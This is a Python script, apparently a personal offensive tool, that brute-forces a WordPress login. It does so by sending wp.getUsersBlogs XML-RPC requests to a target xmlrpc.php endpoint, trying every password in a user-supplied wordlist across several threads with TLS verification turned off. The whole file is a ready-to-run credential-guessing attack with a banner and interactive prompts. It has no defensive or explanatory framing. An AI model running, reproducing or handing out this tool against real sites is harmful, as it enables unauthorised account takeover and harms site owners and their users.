#!/usr/bin/python3

import requests
import signal
import time
from pwn import *
import pdb

#Colors
class colors():
    GREEN = "\033[0;32m\033[1m"
    END = "\033[0m"
    RED = "\033[0;31m\033[1m"
    BLUE = "\033[0;34m\033[1m"
    YELLOW = "\033[0;33m\033[1m"
    PURPLE = "\033[0;35m\033[1m"
    TURQUOISE = "\033[0;36m\033[1m"
    GRAY = "\033[0;37m\033[1m"

def def_handler(sig, frame):
    log.failure("Exiting...")

    if threading.active_count() > 1:
        os.system("tput cnorm")
        os._exit(getattr(os, "_exitcode", 0))
    else:
        os.system("tput cnorm")
        sys.exit(getattr(os, "_exitcode", 0))

signal.signal(signal.SIGINT, def_handler)

terminal_size = os.get_terminal_size()

def banner():
    print('\n     \t' + colors.PURPLE + '_/_/_/                          _/                _/_/_/\n\t' + colors.BLUE + '    _/    _/  _/  _/_/  _/    _/  _/_/_/_/    _/_/    _/    _/  _/  _/_/    _/_/      _/_/_/    _/_/_/\n\t   _/_/_/    _/_/      _/    _/    _/      _/_/_/_/  _/_/_/    _/_/      _/_/_/_/  _/_/      _/_/\n\t' + colors.TURQUOISE + '  _/    _/  _/        _/    _/    _/      _/        _/        _/        _/            _/_/      _/_/\n\t _/_/_/    _/          _/_/_/      _/_/    _/_/_/  _/        _/          _/_/_/  _/_/_/    _/_/_/  ' + colors.GREEN + 'XMLRPC\n' + colors.GRAY + '\n | ' + colors.YELLOW + 'BY ' + colors.GREEN + 'Invertebrado' + colors.GRAY + ' |' + colors.GRAY + '\t| ' + colors.YELLOW + 'PERSONAL PAGE ' + colors.PURPLE + ' https://invertebr4do.github.io' + colors.GRAY + ' |' + colors.GRAY + '\t| ' + colors.YELLOW + 'GITHUB' + colors.BLUE + ' https://github.com/Invertebr4do' + colors.GRAY + ' |' + colors.END)
    time.sleep(0.5)

banner()

print("\n" + colors.GREEN + "─"*120 + "\n" + colors.END)

def makeRequest(url, user, wordlist):

    url = url.rstrip()
    user = user.rstrip()

    for passwd in wordlist:
        passwd = passwd.rstrip()
        p1.status("%s" % passwd)
        data = f"<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{user}</value></param><param><value>{passwd}</value></param></params></methodCall>"
        r = requests.post(url, data=data, verify=False)

        if "Incorrect username or password." not in r.text:
            p1.success("%s" % passwd)

            if threading.active_count() > 1:
                os.system("tput cnorm")
                os._exit(getattr(os, "_exitcode", 0))
            else:
                os.system("tput cnorm")
                sys.exit(getattr(os, "_exitcode", 0))

if __name__ == '__main__':

    try:
        while True:
            url = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the URL [e.g: http://localhost/xmlrpc.php]" + colors.PURPLE + " ~> " + colors.END).rstrip())
            
            if "xmlrpc.php" not in url or "http://" not in url and "https://" not in url:
                print(colors.RED + "\n[!] Invalid URL\n" + colors.END)
            else:
                break

        while True:
            user = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the USERNAME" + colors.PURPLE + " ~> " + colors.END).rstrip())

            if len(user.rstrip()) < 1:
                print(colors.RED + "\n[!] Invalid USERNAME\n" + colors.END)
            else:
                break

        while True:
            wordlist = input(str(colors.PURPLE + "█ " + colors.GRAY + "Enter the WORDLIST" + colors.PURPLE + " ~> " + colors.END).rstrip())
            
            if os.path.isfile(wordlist.rstrip()):
                wordlist = open(wordlist.rstrip("\n"), 'r')
                break
            else:
                print(colors.RED + "\n[!] Invalid WORDLIST\n" + colors.END)

        while True:
            nthreads = input(str(colors.PURPLE + "\n█ " + colors.GRAY + "How many threads do you want to use?" + colors.PURPLE + " ~> " + colors.END).rstrip())

            if nthreads.rstrip() == '' or int(nthreads.rstrip()) < 1:
                nthreads = 1
                break
            else:
                break

    except Exception as e:
        print(colors.RED + "─"*terminal_size.columns + "\n" + colors.END)
        log.failure(str(e))
        print("\n" + colors.RED + "─"*terminal_size.columns + "\n" + colors.END)
        sys.exit(1)

    threads = []

    print("\n" + colors.PURPLE + "─"*terminal_size.columns + "\n" + colors.END)

    p2 = log.info("Bruteforcing %s" % user)
    p1 = log.progress("Password")

    try:
        for i in range(0, int(nthreads)):
            t = threading.Thread(target=makeRequest, args=(url, user, wordlist,))
            threads.append(t)
            sys.stderr = open("/dev/null", "w")

        for x in threads:
            x.start()

        for x in threads:
            x.join()

    except Exception as e:
        print(colors.RED + "─"*terminal_size.columns + "\n" + colors.END)
        log.failure(str(e))
        print("\n" + colors.RED + "─"*terminal_size.columns + "\n" + colors.END)
        sys.exit(1)
